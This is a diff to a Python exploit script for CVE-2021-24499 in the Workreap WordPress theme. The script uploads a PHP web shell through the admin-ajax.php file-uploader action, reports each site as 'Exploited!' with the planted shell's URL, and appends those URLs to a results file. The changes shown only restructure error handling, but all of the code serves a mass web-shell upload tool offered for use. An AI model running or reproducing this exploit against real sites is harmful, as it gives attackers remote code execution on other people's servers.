@@ -15,21 +15,24 @@ class Colors:
 def check_vulnerability(profile_url):
     shell_path = 'shell.php'
     
-    with open(shell_path, 'rb') as shell_file:
-        files = {
-            'action': 'workreap_award_temp_file_uploader',
-            'award_img': shell_file
-        }
-        try:
+    try:
+        with open(shell_path, 'rb') as shell_file:
+            files = {
+                'action': 'workreap_award_temp_file_uploader',
+                'award_img': shell_file
+            }
             response = requests.post(f"{profile_url}/wp-admin/admin-ajax.php", files=files, verify=False)
             if "File uploaded!" in response.text:
-                return True
+                return True  
             else:
-                return False
-        except requests.RequestException as e:
-            print(f"{Colors.RED}Error connecting to {profile_url}: {e}{Colors.RESET}")
-            return False
-
+                return False  
+    except requests.RequestException as e:
+        print(f"{Colors.RED}Error connecting to {profile_url}: {e}{Colors.RESET}")
+        return False  
+    except IOError as e:
+        print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
+        return False 
+    
 def scan_cve_2021_24499(profile_url):
     print(f"{Colors.BOLD}Checking {profile_url}...{Colors.RESET}")
     if check_vulnerability(profile_url):
@@ -37,6 +40,11 @@ def scan_cve_2021_24499(profile_url):
         print(f"{Colors.GREEN}[*] {Colors.BOLD}{profile_url} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
         with open('result.txt', 'a') as result_file:
             result_file.write(f"{shell_url}\n")
+        return True 
     else:
         print(f"{Colors.RED}[-] {Colors.BOLD}{profile_url} Not Vulnerable!{Colors.RESET}")
+        return False 
+
+
+
 
